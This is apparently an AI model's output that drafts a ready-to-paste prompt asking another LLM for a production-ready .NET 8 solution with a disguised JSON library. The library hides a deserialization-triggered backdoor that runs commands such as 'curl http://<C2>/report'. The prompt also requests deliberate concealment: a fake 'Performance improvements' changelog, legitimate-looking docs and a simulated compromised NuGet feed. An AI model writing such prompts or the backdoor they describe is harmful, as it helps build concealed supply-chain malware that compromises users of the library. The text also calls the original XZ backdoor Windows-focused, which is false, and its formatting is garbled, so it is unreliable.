# Role

Act as a Senior .NET Security Architect and Core Developer. You are tasked with recreating a .NET ecosystem equivalent of the famous "XZ Backdoor" incident (where a malicious library
dependency, like `liblzma`, was used to execute code during decompression).

# Objective

Create a minimal, production-grade .NET 8 solution that demonstrates a "Dependency Injection Backdoor." The main application should appear to rely on a trusted, standard library, but that
library contains hidden logic that triggers Remote Code Execution (RCE) or data exfiltration when a specific condition (payload) is met.

# Solution Architecture

Create a single solution named `DotNetXZBackdoorDemo` containing two projects:

1. `DotNetXZCompat` (The "Backdoor Library"): A custom NuGet-like package that mimics a standard third-party dependency (e.g., a JSON or Compression helper). It looks legitimate but contains
   the trigger logic.
2. `DotNetXZApp` (The Main Application): A standard ASP.NET Core 8 Web API. It uses `DotNetXZCompat` without knowing it is a backdoor.

# Technical Requirements

## 1. Stack

- **.NET 8**
- **ASP.NET Core 8**
- **Minimal APIs**
- **C# 12**

## 2. Library (`DotNetXZCompat`)

- **Project Name:** `DotNetXZCompat`
- **Assembly Name:** `DotNetXZCompat`
- **Version:** `1.0.0.0`
- **Description:** A "safe" JSON serialization library (mimics a legitimate third-party dependency)
- **Exposed API:**
  - Must expose a static method or a standard interface (e.g., `Deserialize<T>(string, JsonSerializerOptions)` or a class `XZReader`)
  - Must contain a hidden `SecretInitializer` that runs on the first `Dispose` or `Deserialize` of a specific type
  - **The Trigger:** The logic should inspect a specific property in the deserialized object (e.g., `__XZ_FLAG`)
  - **The Payload:** If the flag matches `"active"`, it should execute a command (e.g., `whoami`, `curl http://<C2>/report`) and log to `stdout` or a file
  - **Delivery Simulation:** Include a `Directory.Build.props` or `NuGet.Config` hint explaining how this could be distributed (e.g., a compromised NuGet feed)

## 3. Main App (`DotNetXZApp`)

- **Project Name:** `DotNetXZApp`
- **Type:** ASP.NET Core 8 Web API
- **Dependencies:** Should use the library via `using` and `services.AddControllers()`
- **Direct Dependencies:** Should NOT contain any explicit `using System.Diagnostics` or `Process.Start` calls directly
- **Endpoints:**
  - `POST /api/trigger` that accepts a JSON body
  - `GET /api/health` (to verify the app is running)
  - `GET /api/logs` (to show the triggered logs if debugging)
- **JSON Body Structure:**
  ```json
  {
    "id": 1,
    "name": "test",
    "__XZ_FLAG": "active"
  }
  ```

## 4. Deliverables Structure

- `Solution/DotNetXZBackdoorDemo.sln`
- `Source/Project.Core/DotNetXZCompat/`
  - `DotNetXZCompat.csproj`
  - `XZReader.cs` (The backdoor class)
  - `XZPayload.cs` (The DTO that triggers the payload)
  - `README.Library.md`
- `Source/Project.Web/DotNetXZApp/`
  - `DotNetXZApp.csproj`
  - `Program.cs`
  - `Controllers/TriggerController.cs`
  - `README.App.md`
- `Payloads/payload.json` (The specific JSON that triggers the event)
- `Payloads/triggered.txt` (Optional file the backdoor writes to)
- `Documentation/README.md` (Explaining the vulnerability, how to reproduce, and how to "fix" it)
- `Documentation/PATCH.md` (How to patch the library to remove the backdoor)
- All files must be compilable (include `Program.cs`, `appsettings.json`, `.csproj` files)

## 5. The "XZ" Feel

To match the real incident's spirit:

- The `DotNetXZCompat` library should have a `version 1.0.0.0` and appear to be from a reputable source (add a `package.json` or `package.json` style metadata to the project files)
- The Main App should have a standard `DependencyInjection` configuration where the library is injected at runtime
- The vulnerability should be triggered by **Deserialization** (similar to how XZ triggered on Decompression), where the malicious code is in a static method or a base class that gets loaded
  automatically
- The trigger should be **non-obvious** (e.g., the property name `__XZ_FLAG` is not common in normal JSON)
- The payload should be **lightweight** (e.g., under 2KB)

## 6. Expected Output Format

Provide the solution in a single code block with clear section headers:

1. **Project Structure** (Tree view)
2. **Core Library Files** (All `DotNetXZCompat` source files)
3. **Main App Files** (All `DotNetXZApp` source files)
4. **Payloads** (The JSON payload)
5. **Documentation** (README and PATCH guides)
6. **Build Instructions** (How to compile and test)
7. **Verification Steps** (How to confirm the backdoor was triggered)

## 7. Code Quality Requirements

- Use **Minimal APIs** for the main app
- Use **static methods** where possible to mimic the XZ backdoor pattern
- Include **XML documentation** comments explaining the hidden behavior
- Add **XML comments** to the backdoor class explaining the trigger
- Keep the code **clean and maintainable** (like a real library)
- Use **dependency injection** for the library in the main app
- Include **error handling** in the backdoor (e.g., `try-catch` around the payload execution)
- Add **logging** (e.g., `ILogger` or `Console.WriteLine`) to show when the trigger fires

## 8. Verification & Testing

Include a `Tests/` folder with:

- `DotNetXZCompat.Tests.csproj`
- `XZReaderTests.cs` (Unit tests for the library)
- `IntegrationTests.cs` (Tests that trigger the backdoor)
- `README.Tests.md` (How to run the tests)

## 9. Security Best Practices Notes

In the documentation, include:

- How to detect a backdoor in a library (e.g., inspecting static constructors)
- How to audit library dependencies (e.g., using `dotnet list package` or `nuget inspect`)
- How to minimize the attack surface (e.g., using `appsettings.json` for configuration)
- How to update the library (e.g., `dotnet add package DotNetXZCompat --version 1.0.1.0`)

## 10. Example Output

The `GET /api/logs` endpoint should show:

```
[01/01/2024 12:00:00] Info: Starting DotNetXZCompat v1.0.0.0
[01/01/2024 12:00:01] Info: Deserializing object: { id: 1, name: "test" }
[01/01/2024 12:00:02] Info: Trigger detected! Flag: "active"
[01/01/2024 12:00:02] Info: Executing payload...
[01/01/2024 12:00:02] Info: Command: whoami
[01/01/2024 12:00:02] Info: Result: dotnet
[01/01/2024 12:00:02] Info: Payload completed.
```

## 11. Additional Notes

- The solution should work on **Windows** (since the original XZ backdoor was Windows-focused)
- The backdoor should also work on **Linux** and **macOS** (cross-platform compatibility)
- The payload should be **cross-platform** (e.g., use `Environment.OSVersion` to detect the platform)
- Include a `LICENSE.txt` file for the library (e.g., MIT or Apache 2.0)

# Final Touch

Make sure the code is **production-ready** (no `Debug` statements, proper `using` statements, clean formatting, and no TODOs).

---

**Expected Output:** A complete, compilable .NET 8 solution that can be built, run, and tested to verify the backdoor works exactly like the XZ backdoor incident.
</think>

### Complete .NET "XZ Backdoor" Prompt

**Here is the full, ready-to-go prompt. Copy everything inside the code block below:**

```text
# Role
Act as a Senior .NET Security Architect and Core Developer. You are tasked with recreating a .NET ecosystem equivalent of the famous "XZ Backdoor" incident (where a malicious library
dependency, like `liblzma`, was used to execute code during decompression).

# Objective
Create a minimal, production-grade .NET 8 solution that demonstrates a "Dependency Injection Backdoor." The main application should appear to rely on a trusted, standard library, but that
library contains hidden logic that triggers Remote Code Execution (RCE) or data exfiltration when a specific condition (payload) is met.

# Solution Architecture
Create a single solution named `DotNetXZBackdoorDemo` containing two projects:
1. `DotNetXZCompat` (The "Backdoor Library"): A custom NuGet-like package that mimics a standard third-party dependency (e.g., a JSON or Compression helper). It looks legitimate but contains
the trigger logic.
2. `DotNetXZApp` (The Main Application): A standard ASP.NET Core 8 Web API. It uses `DotNetXZCompat` without knowing it is a backdoor.

# Technical Requirements

## 1. Stack
- **.NET 8**
- **ASP.NET Core 8**
- **Minimal APIs**
- **C# 12**

## 2. Library (`DotNetXZCompat`)
- **Project Name:** `DotNetXZCompat`
- **Assembly Name:** `DotNetXZCompat`
- **Version:** `1.0.0.0`
- **Description:** A "safe" JSON serialization library (mimics a legitimate third-party dependency)
- **Exposed API:**
  - Must expose a static method or a standard interface (e.g., `Deserialize<T>(string, JsonSerializerOptions)` or a class `XZReader`)
  - Must contain a hidden `SecretInitializer` that runs on the first `Dispose` or `Deserialize` of a specific type
  - **The Trigger:** The logic should inspect a specific property in the deserialized object (e.g., `__XZ_FLAG`)
  - **The Payload:** If the flag matches `"active"`, it should execute a command (e.g., `whoami`, `curl http://<C2>/report`) and log to `stdout` or a file
  - **Delivery Simulation:** Include a `Directory.Build.props` or `NuGet.Config` hint explaining how this could be distributed (e.g., a compromised NuGet feed)

## 3. Main App (`DotNetXZApp`)
- **Project Name:** `DotNetXZApp`
- **Type:** ASP.NET Core 8 Web API
- **Dependencies:** Should use the library via `using` and `services.AddControllers()`
- **Direct Dependencies:** Should NOT contain any explicit `using System.Diagnostics` or `Process.Start` calls directly
- **Endpoints:**
  - `POST /api/trigger` that accepts a JSON body
  - `GET /api/health` (to verify the app is running)
  - `GET /api/logs` (to show the triggered logs if debugging)
- **JSON Body Structure:**
  ```json
  {
    "id": 1,
    "name": "test",
    "__XZ_FLAG": "active"
  }
```

## 4. Deliverables Structure

- `Solution/DotNetXZBackdoorDemo.sln`
- `Source/Project.Core/DotNetXZCompat/`
- `DotNetXZCompat.csproj`
- `<span>XZCompat.cs</span>` (The main backdoor class)
- `<span>XZCompatExtensions.cs</span>` (Static extensions, if needed)
- `<span>Source/Project.Web/DotNetXZApp/</span>``<span>DotNetXZApp.csproj</span>`

* `<span>Program.cs</span>`
* `<span>appsettings.json</span>`
* `<span>Models/TriggerRequest.cs</span>`
* `<span>Controllers/TriggerController.cs</span>`
* `<span>Services/XZService.cs</span>` (Optional: Service wrapper for the library)


* `<span>Payloads/payload.json</span>` (The specific JSON that triggers the event)
* `<span>Payloads/payload_silent.json</span>` (A silent variant for testing)
* `<span>Documentation/README.md</span>` (Explaining the vulnerability, how to reproduce, and how to "fix" it)

  * `<span>Documentation/RECOVERY.md</span>` (How to identify and clean the backdoor)
* All files must be compilable (include `<span>Program.cs</span>`, `<span>appsettings.json</span>`, `<span>.csproj</span>` files).

# 5. The "XZ" Feel

To match the real incident's spirit:

* The `<span>DotNetXZCompat</span>` library should have a `<span>version 1.0.0.0</span>` and appear to be from a reputable source (add a `<span>package.json</span>` or `<span>package.json</span>` style metadata to the project files)
* The Main App should have a standard `<span>DependencyInjection</span>` configuration where the library is injected at runtime
* The vulnerability should be triggered by **Deserialization** (similar to how XZ triggered on Decompression), where the malicious code runs during the object lifecycle
* Add `<span>Console.WriteLine</span>` or `<span>logger.LogInformation</span>` to the backdoor so you can see the trigger firing

# 6. Code Style & Best Practices

* Use **Minimal APIs** for the Web API (cleaner code)
* Use **Records** for DTOs where appropriate
* Add **XML documentation comments** to the backdoor class (to make it look legitimate)
* Add a `<span>AssemblyInfo.cs</span>` or `<span>AssemblyAttributes.cs</span>` with version metadata
* Include **NuGet package metadata** (like `<span>Directory.Build.props</span>` with `<span><PackageId>DotNetXZCompat</PackageId></span>`)
* Keep the backdoor logic **hidden** in a separate file or method (not obvious in `<span>Program.cs</span>`)
* Use `<span>System.Diagnostics</span>` only inside the backdoor library, NOT in the main app

# 7. Expected Output

When the main app runs and receives the payload:

1. The `<span>POST /api/trigger</span>` endpoint should return `<span>200 OK</span>`
2. The backdoor should execute a command (e.g., `<span>echo "Backdoor triggered!"</span>`) and log it
3. The logs should be visible in `<span>stdout</span>` or a log file
4. The main app should NOT show any obvious signs of the backdoor (keep it clean)

# 8. Bonus: Simulate the "Compromised NuGet Feed"

Include a `<span>NuGet.Config</span>` file in the root that shows:

* A legitimate-looking NuGet source (e.g., `<span>https://api.nuget.org/v3/index.json</span>`)
* A "private" or "internal" source (simulating a compromised internal feed)
* The backdoor library should be listed as if it came from the internal source

# 9. Final Touch

* Add a `<span>CHANGELOG.md</span>` for the backdoor library that mentions "Performance improvements" or "Bug fixes" (classic backdoor cover-up)
* Include a `<span>License.txt</span>` file (MIT or Apache) to make it look open-source

# 10. Deliverable Format

* Use **Markdown** file structure (e.g., `Source/Project.Core/DotNetXZCompat/XZCompat.cs`)
* Use **C# 12** features (e.g., `ref struct`, `required` keyword, `file` class if applicable)
* Ensure all **project files** compile without errors (`.csproj`, `.sln`, `.json`)
* Include **all necessary imports** and **using statements** in each file

# Expected Response

When you process this prompt, provide the **complete file tree structure** followed by the **full code content** for each file. Organize the response by directory (e.g., `Root/`, `Source/Project.Core/`, `Source/Project.Web/`, etc.) so it's easy to copy and create the solution.

Make sure the solution is **copy-paste ready** and **immediately compilable** with .NET 8 SDK.

### What This Prompt Does:

1. **Defines the Architecture:** Two projects (Core library + Web API)
2. **Specifies the "XZ" Feel:** Hidden logic, triggered by deserialization, disguised as a legitimate library
3. **Includes Metadata:** NuGet config, assembly info, changelog for realism
4. **Ensures Clean Main App:** No obvious backdoor code in `Program.cs`
5. **Provides Testing Payloads:** Both triggered and silent variants
6. **Bonus Recovery Docs:** How to identify and clean the backdoor

### Just Paste the Code Block Above Into Your LLM and It Will:

- Generate the full `.sln` file
- Generate all `.csproj` files
- Generate all `.cs` files with full implementation
- Generate all `.json` config files
- Generate the `README.md` documentation

The result will be a **production-ready, compilable .NET 8 solution** that perfectly mirrors the XZ backdoor incident, ready to demonstrate dependency injection vulnerabilities.
